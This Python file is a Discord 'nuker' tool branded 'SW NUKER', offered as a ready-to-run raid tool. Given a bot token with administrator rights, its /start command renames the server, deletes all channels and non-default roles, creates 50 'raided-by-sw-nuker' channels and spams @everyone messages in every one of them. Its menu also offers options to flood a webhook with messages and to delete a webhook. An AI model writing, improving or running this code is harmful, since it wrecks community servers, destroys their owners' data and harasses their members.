import discord
from discord.ext import commands
import asyncio
import aiohttp
from colorama import init, Fore
import os
import time
import threading

init()

ART = f"""
{Fore.RED}░██████╗░██╗░░░░░░░██╗  ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
██╔════╝░██║░░██╗░░██║  ████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
╚█████╗░░╚██╗████╗██╔╝  ██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
░╚═══██╗░░████╔═████║░  ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
██████╔╝░░╚██╔╝░╚██╔╝░  ██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
╚═════╝░░░░╚═╝░░░╚═╝░░  ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝{Fore.RESET}
"""

message = "@everyone @here SW NUKER ON TOP"
channel_name = "raided-by-sw-nuker"
new_server_name = "SW NUKER ON TOP"

nuke_running = False
message_count = 0
current_guild = None

intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

def display_menu():
    print(ART)
    print(f"{Fore.RED}1. Nuke Server with Bot Token{Fore.RESET}")
    print(f"{Fore.RED}2. Spam Webhook{Fore.RESET}")
    print(f"{Fore.RED}3. Delete Webhook{Fore.RESET}")
    print(f"{Fore.RED}4. Exit{Fore.RESET}")
    choice = input(f"{Fore.RED}Select an option: {Fore.RESET}")
    return choice

async def console_control():
    """Handle console input for controlling the nuker while bot is running"""
    global nuke_running, message_count
    while True:
        try:
            cmd = await asyncio.get_event_loop().run_in_executor(None, input, f"{Fore.RED}[Console] Enter 'stop' to stop nuke, 'status' to check: {Fore.RESET}")
            cmd = cmd.lower().strip()
            
            if cmd == "stop":
                nuke_running = False
                print(f"{Fore.RED}🛑 NUKE STOPPED via console!{Fore.RESET}")
            elif cmd == "status":
                if nuke_running:
                    print(f"{Fore.RED}✅ NUKE IS RUNNING - Messages sent: {message_count}{Fore.RESET}")
                else:
                    print(f"{Fore.RED}❌ NUKE IS NOT RUNNING{Fore.RESET}")
            else:
                print(f"{Fore.RED}Unknown command. Available: stop, status{Fore.RESET}")
        except:
            break

async def nuke_server():
    global nuke_running, message_count, current_guild
    print(f"{Fore.RED}Make sure your bot has Administrator permissions!{Fore.RESET}")
    bot_token = input(f"{Fore.RED}Enter your bot token: {Fore.RESET}").strip()
    
    if not bot_token or len(bot_token) < 50:
        print(f"{Fore.RED}Invalid token!{Fore.RESET}")
        return
    
    # Start console control listener
    asyncio.create_task(console_control())
    
    try:
        await bot.start(bot_token)
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Fore.RESET}")

async def spam_webhook():
    webhook_url = input(f"{Fore.RED}Enter the webhook URL: {Fore.RESET}")
    msg = input(f"{Fore.RED}Enter the message to spam: {Fore.RESET}")
    count = int(input(f"{Fore.RED}Enter the number of messages: {Fore.RESET}"))

    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(count):
            tasks.append(session.post(webhook_url, json={"content": msg}))
            if len(tasks) >= 10:
                await asyncio.gather(*tasks, return_exceptions=True)
                print(f"{Fore.RED}Sent batch of 10{Fore.RESET}")
                tasks = []
                await asyncio.sleep(0.1)
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

async def delete_webhook():
    webhook_url = input(f"{Fore.RED}Enter the webhook URL to delete: {Fore.RESET}")
    async with aiohttp.ClientSession() as session:
        async with session.delete(webhook_url) as response:
            if response.status == 204:
                print(f"{Fore.RED}Webhook deleted!{Fore.RESET}")
            else:
                print(f"{Fore.RED}Failed! Status: {response.status}{Fore.RESET}")

@bot.event
async def on_ready():
    global current_guild
    print(f'{Fore.RED}✅ Logged in as {bot.user}{Fore.RESET}')
    print(f'{Fore.RED}📊 Bot is in {len(bot.guilds)} server(s){Fore.RESET}')
    
    for guild in bot.guilds:
        print(f'{Fore.RED}📁 Connected to: {guild.name}{Fore.RESET}')
    
    try:
        # Only sync the /start command
        await bot.tree.sync()
        print(f"{Fore.RED}✅ Synced /start command{Fore.RESET}")
        print(f"{Fore.RED}💡 Use /start in Discord to begin{Fore.RESET}")
        print(f"{Fore.RED}🎮 Console commands: type 'stop' or 'status' to control{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}Error syncing commands: {e}{Fore.RESET}")

@bot.tree.command(name="start", description="Start the nuke process")
async def nuke(interaction: discord.Interaction):
    global nuke_running, message_count, current_guild
    
    if nuke_running:
        await interaction.response.send_message("⚠️ Nuke already running! Use console to stop.", ephemeral=True)
        return
    
    guild = interaction.guild
    bot_member = guild.get_member(bot.user.id)
    
    if not bot_member.guild_permissions.administrator:
        await interaction.response.send_message("❌ Bot needs Administrator permissions!", ephemeral=True)
        return
    
    await interaction.response.send_message("💣 **NUKE STARTED!** Use console (type 'stop') to stop.", ephemeral=True)
    nuke_running = True
    message_count = 0
    current_guild = guild

    print(f"{Fore.RED}💣 NUKE STARTED on {guild.name}{Fore.RESET}")

    # Change server name
    try:
        await guild.edit(name=new_server_name)
        print(f"{Fore.RED}✓ Server renamed to {new_server_name}{Fore.RESET}")
    except:
        pass

    # DELETE EVERYTHING - MAX SPEED
    print(f"{Fore.RED}🗑️ Deleting channels...{Fore.RESET}")
    if guild.channels:
        await asyncio.gather(*[c.delete() for c in guild.channels], return_exceptions=True)
    
    print(f"{Fore.RED}🗑️ Deleting roles...{Fore.RESET}")
    if guild.roles:
        await asyncio.gather(*[r.delete() for r in guild.roles if r.name != "@everyone"], return_exceptions=True)
    
    await asyncio.sleep(0.3)

    # CREATE CHANNELS - FAST
    print(f"{Fore.RED}📝 Creating 50 channels...{Fore.RESET}")
    for i in range(0, 50, 5):
        if not nuke_running:
            break
        batch = [guild.create_text_channel(f"{channel_name}-{j+1}") for j in range(i, min(i+5, 50))]
        await asyncio.gather(*batch, return_exceptions=True)
        print(f"{Fore.RED}📝 Created {min(i+5, 50)}/50 channels{Fore.RESET}")
        await asyncio.sleep(0.2)

    # MESSAGE SPAM - MAX SPEED
    if nuke_running and guild.text_channels:
        print(f"{Fore.RED}Messages being sent{Fore.RESET}")
        print(f"{Fore.RED}💡 Type 'stop' in console to stop{Fore.RESET}")
        
        while nuke_running:
            try:
                # Send to ALL channels simultaneously
                await asyncio.gather(*[c.send(message) for c in guild.text_channels], return_exceptions=True)
                message_count += len(guild.text_channels)
                
                # Ultra-fast delay
                await asyncio.sleep(0.05)
                
                # Show speed every 500 messages
                if message_count % 500 == 0:
                    print(f"{Fore.RED}💨 {message_count} messages sent! (~{message_count//10}/sec){Fore.RESET}")
                    
            except Exception as e:
                if "rate" in str(e).lower():
                    await asyncio.sleep(0.5)
                else:
                    pass
    
    print(f"{Fore.RED}✅ Complete! {message_count} messages sent.{Fore.RESET}")
    nuke_running = False

async def main():
    while True:
        choice = display_menu()
        if choice == "1":
            await nuke_server()
        elif choice == "2":
            await spam_webhook()
        elif choice == "3":
            await delete_webhook()
        elif choice == "4":
            print(f"{Fore.RED}Exiting...{Fore.RESET}")
            break
        else:
            print(f"{Fore.RED}Invalid option{Fore.RESET}")

if __name__ == "__main__":
    os.system('')
    asyncio.run(main())
